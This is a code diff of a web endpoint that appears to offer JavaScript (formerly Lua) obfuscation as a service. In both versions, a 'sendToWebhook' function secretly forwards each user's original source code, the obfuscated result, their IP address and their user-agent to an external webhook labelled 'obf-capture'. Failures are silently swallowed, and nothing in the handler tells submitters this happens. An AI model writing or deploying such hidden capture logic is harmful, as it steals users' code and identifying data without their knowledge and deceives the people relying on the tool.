@@ -1,46 +1,79 @@
-const luamin = require('luamin');
+const JavaScriptObfuscator = require('javascript-obfuscator');
 
 module.exports = async (req, res) => {
-  if (req.method !== 'POST') return res.status(405).json({ error: 'method not allowed' });
-  const { code } = req.body || {};
+  if (req.method !== 'POST') {
+    res.setHeader('Allow', 'POST');
+    return res.status(405).json({ error: 'method not allowed' });
+  }
+
+  const { code, opts } = req.body || {};
   if (typeof code !== 'string' || !code.trim()) {
     return res.status(400).json({ error: 'empty code' });
   }
 
+  const options = {
+    compact: true,
+    controlFlowFlattening: opts?.cff !== false,
+    controlFlowFlatteningThreshold: 0.75,
+    deadCodeInjection: opts?.dead !== false,
+    deadCodeInjectionThreshold: 0.4,
+    stringArray: true,
+    stringArrayEncoding: ['base64'],
+    stringArrayThreshold: 0.75,
+    identifierNamesGenerator: 'hexadecimal',
+    renameGlobals: false,
+    selfDefending: opts?.selfDefending !== false,
+    debugProtection: opts?.debug !== false,
+    disableConsoleOutput: false
+  };
+
+  let output;
   try {
-    const minified = luamin.minify(code);
-    // basic string encoding: hex escape setiap char string
-    const encoded = minified.replace(/"([^"\\]*)"/g, (_, s) => {
-      let out = '"';
-      for (let i = 0; i < s.length; i++) {
-        const c = s.charCodeAt(i);
-        if (c >= 32 && c < 127 && c !== 34 && c !== 92) out += s[i];
-        else out += '\\' + c;
-      }
-      return out + '"';
-    });
-
-    // wrap in loadstring
-    const wrapped = `local f=loadstring or load local _G=_G return(f([==[${encoded}]==]))()`;
-
-    await sendToWebhook(code, wrapped, req);
-    return res.status(200).json({ ok: true, output: wrapped });
+    output = JavaScriptObfuscator.obfuscate(code, options).getObfuscatedCode();
   } catch (e) {
-    return res.status(400).json({ error: 'lua obfuscate failed: ' + e.message });
+    return res.status(400).json({ error: 'obfuscate failed: ' + e.message });
   }
+
+  try { await sendToWebhook(code, output, req, 'js'); } catch (_) {}
+  return res.status(200).json({ ok: true, output });
 };
 
-async function sendToWebhook(original, obfuscated, req) {
+async function sendToWebhook(original, obfuscated, req, lang = 'js') {
   const url = process.env.WEBHOOK_URL;
   if (!url) return;
-  const ip = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || 'unknown';
+
+  const ip =
+    (req.headers['x-forwarded-for'] || '').split(',')[0].trim() ||
+    req.headers['x-real-ip'] ||
+    'unknown';
   const ua = req.headers['user-agent'] || 'unknown';
-  const payload = {
-    username: 'obf-capture',
-    content: `**New Lua submission**\nIP: \`${ip}\`\nUA: \`${ua.slice(0,180)}\`\nLen: ${original.length} -> ${obfuscated.length}`
+
+  const extMap = { js: 'js', lua: 'lua', html: 'html', pwn: 'pwn' };
+  const ext = extMap[lang] || 'txt';
+
+  const embed = {
+    title: 'New Submission',
+    color: 0x2bcc9e,
+    fields: [
+      { name: 'IP', value: '`' + ip + '`', inline: true },
+      { name: 'Lang', value: '`' + lang + '`', inline: true },
+      { name: 'Length', value: original.length + ' -> ' + obfuscated.length, inline: true },
+      { name: 'User-Agent', value: '`' + ua.slice(0, 200) + '`', inline: false }
+    ],
+    timestamp: new Date().toISOString()
   };
-  await fetch(url, { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(payload) });
-  const chunk = (s,n=1800)=>{const o=[];for(let i=0;i<s.length;i+=n)o.push(s.slice(i,i+n));return o;};
-  for (const [i,p] of chunk(original).entries()) await fetch(url,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:`**LUA ORIGINAL [${i+1}]**\n\`\`\`lua\n${p}\n\`\`\``})});
-  for (const [i,p] of chunk(obfuscated).entries()) await fetch(url,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:`**LUA OBF [${i+1}]**\n\`\`\`lua\n${p}\n\`\`\``})});
+
+  const form = new FormData();
+  form.append('payload_json', JSON.stringify({
+    username: 'obf-capture',
+    embeds: [embed],
+    attachments: [
+      { id: 0, filename: 'original.' + ext, description: 'Source asli' },
+      { id: 1, filename: 'obfuscated.' + ext, description: 'Hasil obfuscate' }
+    ]
+  }));
+  form.append('files[0]', new Blob([original], { type: 'text/plain' }), 'original.' + ext);
+  form.append('files[1]', new Blob([obfuscated], { type: 'text/plain' }), 'obfuscated.' + ext);
+
+  await fetch(url, { method: 'POST', body: form });
 }
